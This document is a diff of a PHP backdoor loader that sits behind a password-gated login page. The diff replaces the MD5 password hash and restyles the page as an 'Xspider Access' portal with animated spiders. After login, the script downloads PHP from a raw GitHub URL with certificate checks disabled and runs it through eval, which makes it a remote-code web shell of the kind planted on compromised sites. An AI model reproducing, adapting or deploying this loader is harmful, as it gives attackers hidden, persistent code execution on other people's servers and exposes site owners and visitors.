@@ -15,7 +15,7 @@ function geturlsinfo($url) {
         curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
         curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
 
-        // Set cookies using session if available
+
         if (isset($_SESSION['coki'])) {
             curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
         }
@@ -34,135 +34,381 @@ function geturlsinfo($url) {
     return $url_get_contents_data;
 }
 
-// Function to check if the user is logged in
+
 function is_logged_in()
 {
     return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
 }
 
-// Check if the password is submitted and correct
+
 if (isset($_POST['password'])) {
     $entered_password = $_POST['password'];
-    $hashed_password = '37bd8d4f5adc469f75bdc73b2f8edccc'; // Replace this with your MD5 hashed password
+    $hashed_password = '8c32ba4a936d0830cfcfa4c82c75e6db';
     if (md5($entered_password) === $hashed_password) {
-        // Password is correct, store it in session
+
         $_SESSION['logged_in'] = true;
-        $_SESSION['coki'] = 'asu'; // Replace this with your cookie data
+        $_SESSION['coki'] = 'asu';
     } else {
-        // Password is incorrect
+
         echo "Incorrect password. Please try again.";
     }
 }
 
-// Check if the user is logged in before executing the content
+
 if (is_logged_in()) {
     $a = geturlsinfo('https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/alpa.php');
     eval('?>' . $a);
 } else {
-    // Display login form if not logged in
+
     ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Xinz769</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    <meta charset="UTF-8">
+    <title>..:: myblooket.com ::.. - Xspider Access</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600&display=swap" rel="stylesheet">
+    <style>
 
-    html, body {
-      height: 100%;
-      font-family: 'Poppins', sans-serif;
-      background-image: url("https://xinztheonly.one/img/begee.jpg");
-      background-position: center center;
-      background-attachment: fixed;
-      background-repeat: no-repeat;
-      background-size: cover;
-    }
+        * {
+            box-sizing: border-box;
+        }
 
-    body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
+        body {
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
 
-    .container {
-      width: 100%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
-    }
+            background: radial-gradient(circle at top, #150000, #000000);
+            font-family: 'Orbitron', Arial, sans-serif;
+            overflow: hidden;
+            color: #fff;
+        }
 
-    .login-box {
-      background: transparent;
-      border-radius: 12px;
-      padding: 40px;
-      width: 100%;
-      max-width: 400px;
-      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
-      text-align: center;
-    }
 
-    .header-image {
-      margin-bottom: -20px;
-    }
+        .neon-bg {
+            position: absolute;
+            width: 600px;
+            height: 600px;
 
-    .header-image img {
-      max-width: 300px;
-      height: auto;
-    }
+            background: radial-gradient(circle, rgba(255,0,0,0.15), transparent 70%);
+            animation: pulse 6s linear infinite;
+        }
 
-    .form-group {
-      margin-bottom: 20px;
-      text-align: center;
-    }
+        @keyframes pulse {
+            0% { transform: scale(0.8); opacity: .4; }
+            50% { transform: scale(1.1); opacity: .7; }
+            100% { transform: scale(0.8); opacity: .4; }
+        }
 
-    .form-group label {
-      display: block;
-      margin-bottom: 6px;
-      font-weight: 500;
-      color: #fff;
-    }
 
-    .form-group input {
-      width: 50%;
-      padding: 5px 5px;
-      border: 1px solid #ddd;
-      border-radius: 8px;
-      outline: none;
-      font-size: 16px;
-    }
+        .wrapper {
+            position: relative;
+            backdrop-filter: blur(12px);
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(255, 0, 0, 0.4);
+            border-radius: 25px;
+            padding: 30px 40px 40px;
+            width: 420px;
+            text-align: center;
+            box-shadow: 0 0 25px rgba(255, 0, 0, 0.6);
+            animation: floatIn 1.4s ease forwards;
+            opacity: 0;
+            z-index: 10;
+        }
 
-    .form-group input:focus {
-      border-color: #667eea;
-    }
-  </style>
+        @keyframes floatIn {
+            from { transform: translateY(-40px) scale(0.95); opacity: 0; }
+            to { transform: translateY(0) scale(1); opacity: 1; }
+        }
+
+
+        .logo {
+            width: 180px;
+            height: 180px;
+            border-radius: 50%;
+            object-fit: cover;
+            box-shadow: 0 0 25px red;
+            margin: 0 auto 15px;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+            from { box-shadow: 0 0 10px red; }
+            to { box-shadow: 0 0 30px red; }
+        }
+
+ 
+        #typedtext {
+            margin: 10px 0 25px;
+            font-size: 18px;
+            letter-spacing: 2px;
+            color: #ff2a2a;
+            border-right: 2px solid red;
+            white-space: nowrap;
+            overflow: hidden;
+            animation: blink 0.8s infinite;
+        }
+
+        @keyframes blink {
+            0%,100% { border-color: red; }
+            50% { border-color: transparent; }
+        }
+
+
+        .form-group {
+            margin-top: 10px;
+        }
+
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(0,0,0,0.8);
+            border: 1px solid #ff0000;
+            border-radius: 50px;
+            outline: none;
+            color: #fff;
+            font-size: 14px;
+            transition: all .3s ease;
+            font-family: 'Orbitron', Arial, sans-serif;
+        }
+
+        input[type="password"]:focus {
+            box-shadow: 0 0 10px #ff0000;
+            background: rgba(40,0,0,0.9);
+        }
+
+        button {
+            margin-top: 20px;
+            width: 100%;
+            padding: 12px;
+            border-radius: 50px;
+            border: none;
+            background: linear-gradient(45deg, #ff0000, #7a0000);
+            color: #fff;
+            font-weight: bold;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: transform .3s ease, box-shadow .3s ease;
+            font-family: 'Orbitron', Arial, sans-serif;
+        }
+
+        button:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 0 15px red;
+        }
+
+        footer {
+            margin-top: 15px;
+            font-size: 11px;
+            color: rgba(255,255,255,0.4);
+        }
+
+
+        #spiderCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <div class="login-box">
-      <div class="header-image">
-        <img src="https://xinztheonly.one/img/darkartt.png" alt="Logo">
-      </div>
-      <form method="post" action="">
+
+<div class="neon-bg"></div>
+
+<div class="wrapper">
+    <img src="https://myblooket.com/spiderman-here.png" class="logo" draggable="false" alt="Spiderman Logo">
+
+    <div id="typedtext"></div>
+
+    <form method="post">
+        <input type="hidden" name="action" value="login">
         <div class="form-group">
-          <label for="password">la calma vincerà</label>
-          <input type="password" id="password" name="password" required>
+            <input type="password" name="password" placeholder="Enter password..." required>
         </div>
-      </form>
-    </div>
-  </div>
+        <button type="submit">LOGIN ACCESS</button>
+    </form>
+
+    <footer>myblooket secure portal</footer>
+</div>
+
+<script>
+    const text = "Xspider Joins the Party";
+    const speed = 40;
+    let i = 0;
+    const typedtext = document.getElementById("typedtext");
+
+    function typeWriter() {
+        if (i < text.length) {
+            typedtext.innerHTML += text.charAt(i);
+            i++;
+            setTimeout(typeWriter, speed);
+        }
+    }
+
+    window.onload = typeWriter;
+</script>
+
+
+<canvas id="spiderCanvas"></canvas>
+
+<script>
+    const canvas = document.getElementById('spiderCanvas');
+    const ctx = canvas.getContext('2d');
+
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+
+    let spiders = [];
+    const spiderCount = 45;
+
+
+    class Spider {
+        constructor() {
+            this.x = Math.random() * canvas.width;
+            this.y = Math.random() * canvas.height;
+            this.size = Math.random() * 2 + 1;
+            this.speedX = (Math.random() - 0.5) * 0.6;
+            this.speedY = (Math.random() - 0.5) * 0.6;
+        }
+
+        draw() {
+            ctx.beginPath();
+            ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+            ctx.fillStyle = 'rgba(255,0,0,0.6)';
+            ctx.fill();
+        }
+
+        update() {
+            this.x += this.speedX;
+            this.y += this.speedY;
+
+            if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
+            if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
+
+            this.draw();
+        }
+    }
+
+    function initSpiders() {
+        spiders = [];
+        for (let i = 0; i < spiderCount; i++) {
+            spiders.push(new Spider());
+        }
+    }
+
+    function connectSpiders() {
+        for (let i = 0; i < spiders.length; i++) {
+            for (let j = i; j < spiders.length; j++) {
+                let dx = spiders[i].x - spiders[j].x;
+                let dy = spiders[i].y - spiders[j].y;
+                let distance = Math.sqrt(dx * dx + dy * dy);
+                if (distance < 150) {
+                    ctx.beginPath();
+                    ctx.strokeStyle = 'rgba(255,0,0,0.25)';
+                    ctx.lineWidth = 0.5;
+                    ctx.moveTo(spiders[i].x, spiders[i].y);
+                    ctx.lineTo(spiders[j].x, spiders[j].y);
+                    ctx.stroke();
+                }
+            }
+        }
+    }
+
+
+    let bigSpiders = [];
+
+    class BigSpider {
+        constructor() {
+            this.x = Math.random() * canvas.width;
+            this.y = -100;
+            this.size = Math.random() * 15 + 15;
+            this.speed = Math.random() * 0.8 + 0.5;
+            this.swing = Math.random() * Math.PI * 2;
+        }
+
+        draw() {
+
+            ctx.beginPath();
+            ctx.strokeStyle = 'rgba(255,0,0,0.4)';
+            ctx.moveTo(this.x, 0);
+            ctx.lineTo(this.x, this.y);
+            ctx.lineWidth = 1;
+            ctx.stroke();
+
+
+            ctx.beginPath();
+            ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+            ctx.fillStyle = 'rgba(10, 10, 10, 0.9)';
+            ctx.shadowColor = 'red';
+            ctx.shadowBlur = 10;
+            ctx.fill();
+            ctx.shadowBlur = 0;
+
+
+            for (let i = 0; i < 8; i++) {
+                let angle = (Math.PI / 4) * i + this.swing * 0.5;
+                ctx.beginPath();
+                ctx.moveTo(this.x, this.y);
+                ctx.lineTo(
+                    this.x + Math.cos(angle) * this.size * 1.5,
+                    this.y + Math.sin(angle) * this.size * 1.5
+                );
+                ctx.strokeStyle = 'rgba(255,0,0,0.5)';
+                ctx.lineWidth = 1;
+                ctx.stroke();
+            }
+        }
+
+        update() {
+            this.y += this.speed;
+            this.swing += 0.03;
+            this.x += Math.sin(this.swing) * 0.8;
+            this.draw();
+
+            if (this.y > canvas.height + 100) {
+                this.y = -150;
+                this.x = Math.random() * canvas.width;
+            }
+        }
+    }
+
+    function spawnBigSpider() {
+        if (bigSpiders.length < 5) { 
+            bigSpiders.push(new BigSpider());
+        }
+    }
+
+    setInterval(spawnBigSpider, 3000);
+
+    function enhancedAnimate() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height); 
+        
+        spiders.forEach(spider => spider.update());
+        connectSpiders();
+        
+        bigSpiders.forEach(spider => spider.update());
+        
+        requestAnimationFrame(enhancedAnimate);
+    }
+
+    initSpiders();
+    enhancedAnimate();
+
+    window.addEventListener('resize', () => {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        initSpiders();
+    });
+</script>
+
 </body>
 </html>
     <?php
 }
 ?>
-
